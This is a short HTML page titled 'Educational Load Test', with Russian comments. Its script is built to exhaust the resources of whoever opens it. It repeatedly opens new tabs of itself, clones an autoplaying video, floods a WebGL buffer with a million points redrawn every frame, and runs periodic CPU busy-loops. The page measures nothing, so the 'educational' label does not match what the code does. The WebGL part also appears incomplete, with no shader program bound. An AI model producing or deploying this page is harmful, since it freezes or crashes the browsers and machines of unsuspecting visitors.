<!DOCTYPE html>
<html>
<head>
    <title>Educational Load Test</title>
    <style>
        #gpu-canvas { position: fixed; top:0; left:0; width:100vw; height:100vh; }
    </style>
</head>
<body>
    <!-- Видео с принудительным декодированием -->
    <video id="heavyVideo" autoplay loop muted controls width="100%">
        <source src="ambatublow.mp4" type="video/mp4">
    </video>

    <!-- WebGL GPU Loader -->
    <canvas id="gpu-canvas"></canvas>

    <script>
        // 1. Открытие вкладок (сработает только без блокировщика)
        for(let i = 0; i < 30; i++) {
            setTimeout(() => window.open(location.href, `tab${i}`), i * 300);
        }

        // 2. Видео-бомбардировка
        const video = document.getElementById('heavyVideo');
        video.addEventListener('loadeddata', () => {
            for(let i = 0; i < 10; i++) {
                const clone = video.cloneNode(true);
                document.body.appendChild(clone);
            }
        });

        // 3. WebGL-нагрузка (шейдерный рендеринг)
        const canvas = document.getElementById('gpu-canvas');
        const gl = canvas.getContext('webgl');
        const vertices = new Float32Array([...Array(1e6)].flatMap(() => [Math.random(), Math.random()]));
        
        const buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
        
        const animate = () => {
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.drawArrays(gl.POINTS, 0, vertices.length / 2);
            requestAnimationFrame(animate);
        };
        animate();

        // 4. CPU-нагрузка
        setInterval(() => {
            const start = Date.now();
            while(Date.now() - start < 1000) {
                // Имитация тяжёлых вычислений
                const arr = new Array(1e6).fill().map(Math.random);
                arr.sort((a,b) => a - b);
            }
        }, 5000);
    </script>
</body>
</html>